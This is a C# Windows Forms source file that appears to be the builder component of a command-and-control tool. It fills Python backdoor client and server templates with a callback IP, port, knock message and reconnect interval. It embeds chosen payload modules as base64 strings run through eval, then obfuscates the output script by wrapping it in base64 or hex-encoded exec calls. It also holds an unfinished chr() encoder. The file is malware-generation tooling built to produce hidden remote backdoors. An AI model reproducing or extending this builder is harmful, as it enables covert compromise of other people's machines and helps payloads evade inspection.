using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Reception
{
    public partial class frmBuild : Form
    {
        IniManager ini = C2.ini_manager;

        private Dictionary<string, string> code_path = new Dictionary<string, string>()
        {
            { "client" , Path.Combine(new string[] { Application.StartupPath, "Payload", "Python", "Backdoor", "client.py" }) },
            { "server" , Path.Combine(new string[] { Application.StartupPath, "Payload", "Python", "Backdoor", "server.py" }) },
            { "payload", Path.Combine(new string[] { Application.StartupPath, "Payload", "Python", "Backdoor", "Payload" })}
        };

        public frmBuild()
        {
            InitializeComponent();
        }

        void setup()
        {
            //SERVER
            if (C2.ini_manager.ReadIniFile("BUILDER", "dns", "0") == "1")
            {
                checkBox4.Checked = true;
                textBox1.Text = C2.ini_manager.ReadIniFile("BUILDER", "domain", "");
            }
            else
            {
                textBox1.Text = C2.ini_manager.ReadIniFile("BUILDER", "ip", "127.0.0.1");
            }

            numericUpDown1.Value = int.Parse(C2.ini_manager.ReadIniFile("BUILDER", "port", "4444"));
            numericUpDown3.Value = int.Parse(C2.ini_manager.ReadIniFile("BUILDER", "rc_interval", "1"));

            //PROTECTION

            //LOGS
            textBox4.Enabled = checkBox2.Checked && !checkBox3.Checked;

            //KEY EXCHANGE

            //PAYLOAD
            foreach (string file in Directory.GetFiles(code_path["payload"]))
            {
                string _file = Path.GetFileNameWithoutExtension(file);
                string name = _file.Split('-')[0];
                string ver = _file.Split('-')[1];
                ListViewItem item = new ListViewItem(name);
                item.SubItems.Add(ver);
                item.Tag = file;
                listView1.Items.Add(item);
            }
        }

        private string ProtectB64(string code)
        {
            string b64_code = C1.StrE2B64Str(code);
            StringBuilder sb = new StringBuilder();
            StringBuilder new_code = new StringBuilder();
            foreach (char c in b64_code)
            {
                sb.Append(c);
                if (sb.Length == 100)
                {
                    new_code.Append($"'{sb.ToString()}'\n");
                    sb.Clear();
                }
            }
            if (sb.Length > 0)
            {
                new_code.Append($"'{sb.ToString()}'");
            }

            string _code = $"import base64\n\nexec(base64.b64decode(\n{new_code}\n).decode('utf-8'))";
            sb.Clear();
            new_code.Clear();

            return _code;
        }

        private string ProtectHex(string code)
        {
            string hex_code = Convert.ToHexString(Encoding.UTF8.GetBytes(code));
            List<string> line = new List<string>();
            StringBuilder sb = new StringBuilder();
            StringBuilder new_code = new StringBuilder();
            foreach (char c in hex_code)
            {
                sb.Append(c);
                if (sb.Length == 2)
                {
                    line.Add($"0x{sb}, ");
                    if (line.Count == 20)
                    {
                        string _line = string.Join("", line);
                        new_code.Append(_line + "\n");
                        line.Clear();
                    }
                    sb.Clear();
                }
            }

            if (line.Count > 0)
            {
                new_code.Append(string.Join("", line));
                line.Clear();
            }

            string _code = $"exec(bytes((\n{new_code}\n)).decode('utf-8'))";
            return _code;
        }

        //TODO: FINISH THIS CODE
        private string ProtectChr(string code)
        {
            List<int> tmp = new List<int>();
            foreach (string line in code.Split(new string[] { Environment.NewLine }, StringSplitOptions.None))
            {
                foreach (char c in line)
                {
                    int ascii = (int)c;
                    tmp.Add(ascii);
                }
            }

            int width = 20;
            int i = 0;
            StringBuilder sb = new StringBuilder();
            StringBuilder new_code = new StringBuilder();
            foreach (int ascii in tmp)
            {
                if (i == width - 1)
                {
                    sb.Append($@"chr({ascii})");
                    i = 0;
                }
                else
                {
                    sb.Append($@"chr({ascii})+");
                }
            }

            return null;
        }

        private void build()
        {
            string file = code_path[radioButton1.Checked ? "client" : "server"];
            string code = File.ReadAllText(file);

            //PARAMETER
            code = code.Replace("[IP]", textBox1.Text);
            code = code.Replace("[PORT]", numericUpDown1.Value.ToString());
            code = code.Replace("[KNOCK_MSG]", textBox3.Text);
            code = code.Replace("[SLEEP]", numericUpDown3.Value.ToString());

            //LOGS
            if (checkBox2.Checked)
            {

            }

            //ADD PAYLOAD
            StringBuilder sb_payload = new StringBuilder();
            foreach (ListViewItem item in listView1.CheckedItems)
            {
                string py_file = item.Tag.ToString();
                if (!File.Exists(py_file))
                    continue;

                string _code = File.ReadAllText(py_file);
                sb_payload.Append($"eval('{C1.StrE2B64Str(_code)}')\n");
            }
            code = code.Replace("'[PAYLOAD]'", sb_payload.ToString());
            sb_payload.Clear();

            //PROTECTION
            //THIS FUNCTION SHOULD BE USE AT LAST.
            if (checkBox1.Checked) code = ProtectB64(code);
            if (checkBox5.Checked) code = ProtectHex(code);

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = Path.GetFileName(file);
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, code);
                MessageBox.Show("Save file: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void frmBuild_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            build();
        }

        private void groupBox3_Enter(object sender, EventArgs e)
        {

        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            bool bo = radioButton1.Checked;
            numericUpDown2.Enabled = !bo;
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            textBox4.Enabled = checkBox2.Checked && !checkBox3.Checked;
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            textBox4.Enabled =  checkBox2.Checked && !checkBox3.Checked;
        }
    }
}
